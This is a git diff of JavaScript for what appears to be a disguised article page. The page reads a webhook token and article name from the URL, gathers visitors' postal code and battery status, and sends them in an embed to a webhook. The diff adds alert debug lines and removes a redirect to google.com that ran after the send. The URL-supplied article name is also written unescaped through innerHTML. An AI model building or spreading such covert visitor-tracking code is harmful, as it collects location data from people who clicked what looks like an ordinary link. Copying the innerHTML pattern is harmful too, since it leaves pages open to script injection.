@@ -48,6 +48,7 @@ else
         var webhooktoken = segments[3] 
         var articlename = segments[4].replace(/%20/g, " ")
         document.getElementById("articlename").innerHTML = articlename
+            alert(segments[6])
 
 var currentdate = new Date(); 
 let postcode = data.postal
@@ -189,10 +190,7 @@ var myEmbed = {
 
       request.send(JSON.stringify(params));
             
-                   if(segments[6] == "redirect")
-        {
-            window.location.href = "https://google.com"
-        }
+                
 
         }
 
@@ -263,6 +261,7 @@ const battery = await navigator.getBattery();
         var webhooktoken = segments[3] 
         var articlename = segments[4].replace(/%20/g, " ")
         document.getElementById("articlename").innerHTML = articlename
+        alert(segments[6])
 
 var currentdate = new Date(); 
 let postcode = data.postal
@@ -374,10 +373,6 @@ var myEmbed = {
 
       request.send(JSON.stringify(params));
         
-        if(segments[6] == "redirect")
-        {
-            window.location.href = "https://google.com"
-        }
 
         }
 
